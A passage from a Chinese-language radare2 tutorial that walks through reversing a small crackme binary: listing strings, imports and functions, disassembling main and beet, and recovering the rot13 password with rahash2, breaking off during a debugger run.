entrypoint</code>。因此在你熟悉了<code>radare2</code>的能力之后，命令都是比较好记的。但是你不需要记住所有的命令——你可以仅仅需要在（几乎）每个字母后面加上<code>?</code>来获得命令的信息以及它的子命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> i?</span><br><span class="line">|Usage: i Get info from opened file (see rabin2’s manpage)</span><br><span class="line">| Output mode:</span><br><span class="line">| ‘*’                Output in radare commands</span><br><span class="line">| ‘j’                Output in json</span><br><span class="line">| ‘q’                Simple quiet output</span><br><span class="line">| Actions:</span><br><span class="line">| i|ij               Show info of current file (in JSON)</span><br><span class="line">| iA                 List archs</span><br><span class="line">| ia                 Show all info (imports, exports, sections..)</span><br><span class="line">| ib                 Reload the current buffer for setting of the bin (use once only)</span><br><span class="line">| ic                 List classes, methods and fields</span><br><span class="line">| iC                 Show signature info (entitlements, …)</span><br><span class="line">| id                 Debug information (source lines)</span><br><span class="line">| iD lang sym        demangle symbolname for given language</span><br><span class="line">| ie                 Entrypoint</span><br><span class="line">| iE                 Exports (global symbols)</span><br><span class="line">| ih                 Headers (alias for iH)</span><br><span class="line">| iHH                Verbose Headers in raw text</span><br><span class="line">| ii                 Imports</span><br><span class="line">| iI                 Binary info</span><br><span class="line">| ik [query]         Key-value database from RBinObject</span><br><span class="line">| il                 Libraries</span><br><span class="line">| iL                 List all RBin plugins loaded</span><br><span class="line">| im                 Show info about predefined memory allocation</span><br><span class="line">| iM                 Show main address</span><br><span class="line">| io [file]          Load info from file (or last opened) use bin.baddr</span><br><span class="line">| ir|iR              Relocs</span><br><span class="line">| is                 Symbols</span><br><span class="line">| iS [entropy,sha1]  Sections (choose which hash algorithm to use)</span><br><span class="line">| iV                 Display file version info</span><br><span class="line">| iz                 Strings in data sections</span><br><span class="line">| izz                Search for Strings in the whole binary</span><br><span class="line">| iZ                 Guess size of binary program</span><br></pre></td></tr></table></figure><p><code>i</code>命令目的是从打开的文件中获取信息，它就是集成到<code>radare2</code>的shell里的<code>rabin2</code>（之前提到的）。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>默认情况下<code>radare2</code>不会自动分析文件，因为分析文件是一个复杂的过程，尤其是比较大的文件。了解更多关于分析的内容，你可以看一看在<code>radare2</code>博客上的<a href="http://radare.today/posts/analysis-by-default/" target="_blank" rel="noopener">这篇文章</a>。</p><p>显然分析仍然是可能的，<code>r2</code>提供了许多种类的分析方式。正如我之前提到的，我们可以通过对<code>a</code>命令后面添加<code>?</code>来查找分析选项。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">[0x08048370]&gt;</span> a?</span><br><span class="line">|Usage: a[abdefFghoprxstc] […]</span><br><span class="line">| ab [hexpairs]    analyze bytes</span><br><span class="line">| abb [len]        analyze N basic blocks in [len] (section.size by default)</span><br><span class="line">| aa[?]            analyze all (fcns + bbs) (aa0 to avoid sub renaming)</span><br><span class="line">| ac[?] [cycles]   analyze which op could be executed in [cycles]</span><br><span class="line">| ad[?]            analyze data trampoline (wip)</span><br><span class="line">| ad [from] [to]   analyze data pointers to (from-to)</span><br><span class="line">| ae[?] [expr]     analyze opcode eval expression (see ao)</span><br><span class="line">| af[?]            analyze Functions</span><br><span class="line">| aF               same as above, but using anal.depth=1</span><br><span class="line">| ag[?] [options]  output Graphviz code</span><br><span class="line">| ah[?]            analysis hints (force opcode size, …)</span><br><span class="line">| ai [addr]        address information (show perms, stack, heap, …)</span><br><span class="line">| ao[?] [len]      analyze Opcodes (or emulate it)</span><br><span class="line">| aO               Analyze N instructions in M bytes</span><br><span class="line">| ar[?]            like ‘dr’ but for the esil vm. (registers)</span><br><span class="line">| ap               find prelude for current offset</span><br><span class="line">| ax[?]            manage refs/xrefs (see also afx?)</span><br><span class="line">| as[?] [num]      analyze syscall using dbg.reg</span><br><span class="line">| at[?] [.]        analyze execution traces</span><br><span class="line">Examples:</span><br><span class="line">f ts @ S*~text:0[3]; f t @ section..text</span><br><span class="line">f ds @ S*~data:0[3]; f d @ section..data</span><br><span class="line">.ad t t+ts @ d:ds</span><br></pre></td></tr></table></figure><p>我通常开始分析时会执行<code>aa</code>（<code>analyse all</code>）。这个名称有一点容易误解，因为除此之外还有很多可以分析的（执行<code>aa?</code>可以看到更多的用法），但对于这个程序来说已经足够了。这次我们直接执行<code>aaa</code>，更简单些。你也可以执行<code>radare2</code>用<code>-A</code>参数来分析文件，直接在开始就执行<code>aaa</code>（例如<code>r2 -A megabeets_0x1</code>）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> aaa</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[*] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br></pre></td></tr></table></figure><h2 id="标志"><a href="#标志" class="headerlink" title="标志"></a>标志</h2><p>在分析之后，<code>radare2</code>把一些特定的名字和偏移联系在一起，例如区段、函数、符号表、字符串等等。他们被称作为标志。标志被整合进标志空间，一个标志空间是所有类似特征的标志的集合。执行<code>fs</code>以查看所有的标志：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> fs</span><br><span class="line">0    4 . strings</span><br><span class="line">1   35 . symbols</span><br><span class="line">2   82 . sections</span><br><span class="line">3    5 . relocs</span><br><span class="line">4    5 . imports</span><br><span class="line">5    1 . functions</span><br></pre></td></tr></table></figure><p>我们可以使用<code>fs &lt;flagspace&gt;</code>来查看某个特定的标志空间，然后用<code>f</code>输出所有的标志。我们使用分号将一行中的多个命令分开（比如<code>命令一; 命令二; 命令三;...</code>）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> fs imports; f</span><br><span class="line">0x08048320 6 sym.imp.strcmp</span><br><span class="line">0x08048330 6 sym.imp.strcpy</span><br><span class="line">0x08048340 6 sym.imp.puts</span><br><span class="line">0xffffffff 16 loc.imp.__gmon_start__</span><br><span class="line">0x08048350 6 sym.imp.__libc_start_main</span><br></pre></td></tr></table></figure><p>正如我们所看到的，<code>radare2</code>将所有程序所使用的导入表输出——可以看到我们所熟悉的<code>strcmp</code>、<code>strcpy</code>、<code>puts</code>等，包括相关的地址。我们也可以列出字符串的标志空间。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> fs strings; f</span><br><span class="line">0x08048700 21 str._n__.::_Megabeets_::.</span><br><span class="line">0x08048715 23 str.Think_you_can_make_it_</span><br><span class="line">0x0804872c 10 str.Success__n</span><br><span class="line">0x08048736 22 str.Nop__Wrong_argument._n</span><br></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>我们看到<code>r2</code>列出了一些字符串的偏移，还有一些变量名。让我们主要来看看字符串。有很多可以列出程序中字符串的方式，你可以选择你最需要的一种。<br><code>iz</code> – 列出在数据短的字符串<br><code>izz</code> – 在整个程序中查找字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> iz</span><br><span class="line">vaddr=0x08048700 paddr=0x00000700 ordinal=000 sz=21 len=20 section=.rodata type=ascii string=\n .:: Megabeets ::.</span><br><span class="line">vaddr=0x08048715 paddr=0x00000715 ordinal=001 sz=23 len=22 section=.rodata type=ascii string=Think you can make it?</span><br><span class="line">vaddr=0x0804872c paddr=0x0000072c ordinal=002 sz=10 len=9 section=.rodata type=ascii string=Success!\n</span><br><span class="line">vaddr=0x08048736 paddr=0x00000736 ordinal=003 sz=22 len=21 section=.rodata type=ascii string=Nop, Wrong argument.\n</span><br></pre></td></tr></table></figure><p>我们已经熟悉了大部分字符串——还记得我们一开始运行程序时的那几行字符串吧。但是我们没有看到<code>Success</code>，这应该是我们输入正确字符串后的提示。既然我们已经得到了字符串，让我们看看它们在程序的什么地方被使用了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> axt @@ str.*</span><br><span class="line">data 0x8048609 push str._n__.::_Megabeets_::. in main</span><br><span class="line">data 0x8048619 push str.Think_you_can_make_it_ in main</span><br><span class="line">data 0x8048646 push str._n_tSuccess__n in main</span><br><span class="line">data 0x8048658 push str._n_tNop__Wrong_argument._n in main</span><br></pre></td></tr></table></figure><p>这个命令展示给我们<code>radare2</code>更多的特点。<code>axt</code>命令用来在数据段或程序段交叉查找某个地址（试试<code>ax?</code>）。<code>@@</code>是一个迭代器标志，用来在一段偏移上重复某个命令（试试<code>@@?</code>）。<code>str.*</code>是一个对所有开头为<code>str.</code>的标志的通配。这条命令能帮助我列出字符串标志以及对应所在的函数名。在这之前要确保选择了字符串的标志空间（默认时是<code>fs *</code>）。</p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><p>正如我之前所说的，之前我们一直在程序的入口点，现在应该去其他地方看看了。我们刚列出来的字符串都是在<code>main</code>函数中的。为了定位到字符串，我们需要使用<code>seek</code>命令，用<code>s</code>替代。正如大家所知道的，在（几乎）每个命令后加上<code>?</code>会解决你所有的问题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> s?</span><br><span class="line">|Usage: s  # Seek commands</span><br><span class="line">| s                 Print current address</span><br><span class="line">| s addr            Seek to address</span><br><span class="line">| s-                Undo seek</span><br><span class="line">| s- n              Seek n bytes backward</span><br><span class="line">| s–                Seek blocksize bytes backward</span><br><span class="line">| s+                Redo seek</span><br><span class="line">| s+ n              Seek n bytes forward</span><br><span class="line">| s++               Seek blocksize bytes forward</span><br><span class="line">| s[j*=]            List undo seek history (JSON, =list, *r2)</span><br><span class="line">| s/ DATA           Search for next occurrence of ‘DATA’</span><br><span class="line">| s/x 9091          Search for next occurrence of \x90\x91</span><br><span class="line">| s.hexoff          Seek honoring a base from core-&gt;offset</span><br><span class="line">| sa [[+-]a] [asz]  Seek asz (or bsize) aligned to addr</span><br><span class="line">| sb                Seek aligned to bb start</span><br><span class="line">| sC[?] string      Seek to comment matching given string</span><br><span class="line">| sf                Seek to next function (f-&gt;addr+f-&gt;size)</span><br><span class="line">| sf function       Seek to address of specified function</span><br><span class="line">| sg/sG             Seek begin (sg) or end (sG) of section or file</span><br><span class="line">| sl[?] [+-]line    Seek to line</span><br><span class="line">| sn/sp             Seek next/prev scr.nkey</span><br><span class="line">| so [N]            Seek to N next opcode(s)</span><br><span class="line">| sr pc             Seek to register</span><br></pre></td></tr></table></figure><p><code>seek</code>命令是接收一个地址或是一个数学表达式作为参数。这个表达式可以是数学运算、标志或者内存访问操作。我们可以执行<code>s main</code>来定位到main函数。让我们先通过<code>afl</code>命令（Analyze Functions List）来查看<code>radare2</code>为我们列出了哪些函数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> afl</span><br><span class="line">0x080482ec    3 35           sym._init</span><br><span class="line">0x08048320    1 6            sym.imp.strcmp</span><br><span class="line">0x08048330    1 6            sym.imp.strcpy</span><br><span class="line">0x08048340    1 6            sym.imp.puts</span><br><span class="line">0x08048350    1 6            sym.imp.__libc_start_main</span><br><span class="line">0x08048360    1 6            sub.__gmon_start___252_360</span><br><span class="line">0x08048370    1 33           entry0</span><br><span class="line">0x080483a0    1 4            sym.__x86.get_pc_thunk.bx</span><br><span class="line">0x080483b0    4 43           sym.deregister_tm_clones</span><br><span class="line">0x080483e0    4 53           sym.register_tm_clones</span><br><span class="line">0x08048420    3 30           sym.__do_global_dtors_aux</span><br><span class="line">0x08048440    4 43   -&gt; 40   sym.frame_dummy</span><br><span class="line">0x0804846b   19 282          sym.rot13</span><br><span class="line">0x08048585    1 112          sym.beet</span><br><span class="line">0x080485f5    5 127          main</span><br><span class="line">0x08048680    4 93           sym.__libc_csu_init</span><br><span class="line">0x080486e0    1 2            sym.__libc_csu_fini</span><br><span class="line">0x080486e4    1 20           sym._fini</span><br></pre></td></tr></table></figure><p>这些导入函数正是我们之前所看到的，包括入口点、libc、main函数和两个引人注意的函数分别叫做<code>sym.beet</code>和<code>sym.rot13</code>。</p><h1 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h1><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p>是时候去看看汇编代码了。首先我们用<code>s main</code>来定位到main函数，然后用<code>pdf</code>命令（Print Disassemble Function）来反汇编。注意地址是怎么准确地变成main函数的地址的。</p><blockquote><ul><li>注意：正如我之前所说的，这篇文章的目的是教大家学习和了解<code>radare2</code>，而不是教汇编语言的。因此我不会彻底地解释代码。实际上，这个程序也很简单，你只要有一点点基础的逆向工程知识就能掌握。</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> s main</span><br><span class="line"><span class="meta">[0x080485f5]&gt;</span> pdf</span><br><span class="line">          ;– main:</span><br><span class="line">/ (fcn) main 127</span><br><span class="line">|   main ();</span><br><span class="line">|           ; var int local_8h @ ebp-0x8</span><br><span class="line">|           ; var int local_4h @ esp+0x4</span><br><span class="line">|              ; DATA XREF from 0x08048387 (entry0)</span><br><span class="line">|           0x080485f5      8d4c2404       lea ecx, [esp + local_4h]   ; 0x4</span><br><span class="line">|           0x080485f9      83e4f0         and esp, 0xfffffff0</span><br><span class="line">|           0x080485fc      ff71fc         push dword [ecx – 4]</span><br><span class="line">|           0x080485ff      55             push ebp</span><br><span class="line">|           0x08048600      89e5           mov ebp, esp</span><br><span class="line">|           0x08048602      53             push ebx</span><br><span class="line">|           0x08048603      51             push ecx</span><br><span class="line">|           0x08048604      89cb           mov ebx, ecx</span><br><span class="line">|           0x08048606      83ec0c         sub esp, 0xc</span><br><span class="line">|           0x08048609      6800870408     push str._n__.::_Megabeets_::. ; str._n__.::_Megabeets_::.</span><br><span class="line">|           0x0804860e      e82dfdffff     call sym.imp.puts          ; int puts(const char *s)</span><br><span class="line">|           0x08048613      83c410         add esp, 0x10</span><br><span class="line">|           0x08048616      83ec0c         sub esp, 0xc</span><br><span class="line">|           0x08048619      6815870408     push str.Think_you_can_make_it_ ; “Think you can make it?” @ 0x8048715</span><br><span class="line">|           0x0804861e      e81dfdffff     call sym.imp.puts          ; int puts(const char *s)</span><br><span class="line">|           0x08048623      83c410         add esp, 0x10</span><br><span class="line">|           0x08048626      833b01         cmp dword [ebx], 1          ; [0x1:4]=0x1464c45</span><br><span class="line">|       ,=&lt; 0x08048629      7e2a           jle 0x8048655</span><br><span class="line">|       |   0x0804862b      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=0x10101</span><br><span class="line">|       |   0x0804862e      83c004         add eax, 4</span><br><span class="line">|       |   0x08048631      8b00           mov eax, dword [eax]</span><br><span class="line">|       |   0x08048633      83ec0c         sub esp, 0xc</span><br><span class="line">|       |   0x08048636      50             push eax</span><br><span class="line">|       |   0x08048637      e849ffffff     call sym.beet</span><br><span class="line">|       |   0x0804863c      83c410         add esp, 0x10</span><br><span class="line">|       |   0x0804863f      85c0           test eax, eax</span><br><span class="line">|      ,==&lt; 0x08048641      7412           je 0x8048655</span><br><span class="line">|      ||   0x08048643      83ec0c         sub esp, 0xc</span><br><span class="line">|      ||   0x08048646      682c870408     push str.Success__n ; “Success!.” @ 0x804872c</span><br><span class="line">|      ||   0x0804864b      e8f0fcffff     call sym.imp.puts          ; int puts(const char *s)</span><br><span class="line">|      ||   0x08048650      83c410         add esp, 0x10</span><br><span class="line">|     ,===&lt; 0x08048653      eb10           jmp 0x8048665</span><br><span class="line">|     |||      ; JMP XREF from 0x08048629 (main)</span><br><span class="line">|     |||      ; JMP XREF from 0x08048641 (main)</span><br><span class="line">|     |-&gt; 0x08048655      83ec0c         sub esp, 0xc</span><br><span class="line">|     |     0x08048658      6836870408     push str.Nop__Wrong_argument._n ; “Nop, Wrong argument..” @ 0x8048736</span><br><span class="line">|     |     0x0804865d      e8defcffff     call sym.imp.puts          ; int puts(const char *s)</span><br><span class="line">|     |     0x08048662      83c410         add esp, 0x10</span><br><span class="line">|     |        ; JMP XREF from 0x08048653 (main)</span><br><span class="line">|     `—&gt; 0x08048665      b800000000     mov eax, 0</span><br><span class="line">|           0x0804866a      8d65f8         lea esp, [ebp – local_8h]</span><br><span class="line">|           0x0804866d      59             pop ecx</span><br><span class="line">|           0x0804866e      5b             pop ebx</span><br><span class="line">|           0x0804866f      5d             pop ebp</span><br><span class="line">|           0x08048670      8d61fc         lea esp, [ecx – 4]</span><br><span class="line">\           0x08048673      c3             ret</span><br></pre></td></tr></table></figure><p>看过汇编代码后，我们可以写出一段简单的伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">1</span> &amp;&amp; beet(argv[<span class="number">1</span>]) == <span class="literal">true</span>) </span><br><span class="line"><span class="meta"># i.e - <span class="meta-keyword">if</span> any argument passed to the program AND the result of beet, given the passed argument, is true</span></span><br><span class="line"><span class="meta"># argc is the number of arguments passed to the program</span></span><br><span class="line"><span class="meta"># argc will be at least 1 becuase the first argument is the program name</span></span><br><span class="line"><span class="meta"># argv is the array of parameters passed to the program</span></span><br><span class="line">&#123;</span><br><span class="line">    print <span class="string">"success"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">     print <span class="string">"fail"</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="可视化模式和图形模式"><a href="#可视化模式和图形模式" class="headerlink" title="可视化模式和图形模式"></a>可视化模式和图形模式</h2><p><code>radare2</code>有着一个非常强大、效率极高的可视化模式。可视化模式对用户非常友好并且将使用<code>r2</code>的逆向过程带到了一个新的高度。按下<code>V</code>键开启可视化模式。按下<code>p</code>/<code>P</code>键用来切换模式。在屏幕的最上方可以看到你输入的命令。这里按<code>p</code>可以切换回原来的反汇编模式。</p><p><img src="https://www.megabeets.net/uploads/visualMode_1.png" alt></p><h3 id="可视化模式基本命令"><a href="#可视化模式基本命令" class="headerlink" title="可视化模式基本命令"></a>可视化模式基本命令</h3><h4 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h4><p>你可以通过<code>k</code>向上移动，通过<code>j</code>向下移动。回车键可以<code>jmp</code>或者<code>call</code>到目标地址。同时在每个<code>jmp</code>或<code>call</code>右侧注释的方括号中有数字，直接按相应的数字可跳转到对应地址。</p><h4 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h4><p>正如之前命令行下的<code>radare2</code>，按下<code>?</code>可以为你展现帮助窗口，你可以学习可视化模式下的各个命令。</p><h4 id="交叉引用"><a href="#交叉引用" class="headerlink" title="交叉引用"></a>交叉引用</h4><p>用<code>x</code>/<code>X</code>分别来列出当前函数的引用和调用的情况。按下对应数字来跳转。</p><h4 id="radare2命令"><a href="#radare2命令" class="headerlink" title="radare2命令"></a><code>radare2</code>命令</h4><p>使用：在可视化模式下输入<code>:command</code>来执行<code>r2</code>命令</p><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>你可以通过<code>;[-]comment</code>来添加或删去注释。</p><h4 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h4><p><code>m&lt;key&gt;</code>可以用来标记特定的偏移地址。<code>&#39;&lt;key&gt;</code>来跳到指定地址。</p><h4 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h4><p>按下<code>q</code>键返回到<code>r2</code>的shell。</p><h3 id="可视化图形模式"><a href="#可视化图形模式" class="headerlink" title="可视化图形模式"></a>可视化图形模式</h3><p>和其他的一些反汇编器一样，<code>radare2</code>也有图形视图。你可以输入<code>VV</code>从shell进入图形视图，通过<code>k</code>/<code>j</code>/<code>h</code>/<code>l</code>向上/下/左/右移动，按<code>g</code>键跳转到目标函数（例如<code>gd</code>）。</p><p><img src="https://www.megabeets.net/uploads/visualGraph_1.png" alt></p><p>按<code>?</code>来列出所有的命令，其中<code>R</code>命令值得一学。</p><h2 id="反汇编beet函数"><a href="#反汇编beet函数" class="headerlink" title="反汇编beet函数"></a>反汇编<code>beet</code>函数</h2><p>接下来回到反汇编函数上，看看<code>beet</code>函数。正如我们之前所看到的，我们的程序检查了<code>beet</code>的返回结果，也就是我们输入的参数。我们可以通过一些方式输出<code>beet</code>的返回值，这里列出几种：</p><ol><li>在<code>r2</code>的shell中定位到<code>beet</code>函数，然后通过<code>s sym.beet</code>（<code>sym.beet</code>是<code>beet</code>函数的一个标志。你可以通过<code>f sym.&lt;tab&gt;</code>输出出<code>sym</code>的标志）输出函数，然后执行<code>pdf</code>（Print Disassemble Function）；</li><li>在<code>r2</code>的shell下，通过<code>pdf @ sym.beet</code>输出<code>beet</code>函数。<code>@</code>是临时的定位（输出<code>sym.beet</code>地址处的函数）；</li><li>可视化模式下在main函数下跳到<code>beet</code>函数；</li><li>可视化图形界面下在main函数中使用<code>gd</code>（<code>d</code>是<code>call</code>边上的字母）</li></ol><p>这是<code>beet</code>函数在图形视图下的样子：</p><p><img src="https://www.megabeets.net/uploads/visualGraph_beet1.png" alt></p><p>我们可以看到输入的参数被复制给了一个缓冲空间。缓存区的位置在<code>ebp - local_88h</code>。<code>local_88h</code>其实是0x88，也就是十进制的136。在可视化模式下，我们可以用<code>:</code>执行<code>r2</code>的命令<code>? 0x88</code>查看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:&gt; ? 0x88</span><br><span class="line">136 0x88 0210 136 0000:0088 136 “\x88” 10001000 136.0 136.000000f 136.000000</span><br></pre></td></tr></table></figure><p>由于4个字节保存了前一个栈帧的ebp值，接下来的4个字节则是返回地址，因此在栈上的缓冲区大小为128个字节，总共为136个字节。</p><p>在缓冲区之后是我们输入的参数，它和函数<code>sym.rot13</code>的结果进行比较。<a href="https://en.wikipedia.org/wiki/ROT13" target="_blank" rel="noopener">Rot-13</a>是一个著名的置换加密，经常在CTF以及Crackme中使用。这个函数接收了9个十六进制数，看起来<code>radare2</code>没有把它们识别成一个字符串。我们可以在其地址上执行<code>ahi s</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7</span><br></pre></td></tr></table></figure><p><code>ahi s</code>用来将将具体地址转换成字符串（试试<code>ahi?</code>）。<code>@@</code>是一个迭代器（试试<code>@@</code>），然后这些地址则是<code>sym.beet</code>函数中没被<code>radare2</code>识别成字符串的部分。执行完这条命令后，图形视图会自动刷新（如果没有自动刷新，执行<code>r</code>）成这样：</p><p><img src="https://www.megabeets.net/uploads/visualGraph_beet2.png" alt></p><p>看起来没被识别出来的字符串是<code>Megabeets</code>（根据<a href="https://en.wikipedia.org/wiki/Endianness" target="_blank" rel="noopener">字节序</a>反向压栈得到）。</p><p>该程序通过<code>strcmp</code>将经过rot13处理后的<code>Megabeets</code>与我们输入的参数进行比较。幸运的是我们不需要辛苦地分析rot13的具体算法，因为<code>r2</code>框架中的<code>rahash2</code>工具已经包含了rot13加密。</p><p><code>rahash2</code>通过不同的算法计算文件或是字符串的校验值。</p><p>使用<code>man rahash2</code>查看更多的用法。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:&gt; !rahash2 -E rot -S s:13 -s ‘Megabeets\n’</span><br><span class="line">Zrtnorrgf</span><br></pre></td></tr></table></figure><p><code>rahash2</code>执行了<code>rot13(“Megabeets”)</code>后得到了字符串<code>Zrtnorrgf</code>。输入<code>!</code>可以在<code>r2</code>的shell下执行系统命令。我们假设<code>Zrtnorrgf</code>就是要和我们的输入进行比较的字符串。让我们在调试模式下打开程序，使用<code>ood</code>（试试<code>ood?</code>）并将<code>Zrtnorrgf</code>作为参数，看看我们会得到什么。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7749be9]&gt;</span> ood?</span><br><span class="line">| ood [args]    reopen in debugger mode (with args)</span><br><span class="line"><span class="meta">[0xf7749be9]&gt;</span> ood Zrtnorrgf</span><br><span class="line">Wait event received by different pid 7415</span><br><span class="line">Wait event received by different pid 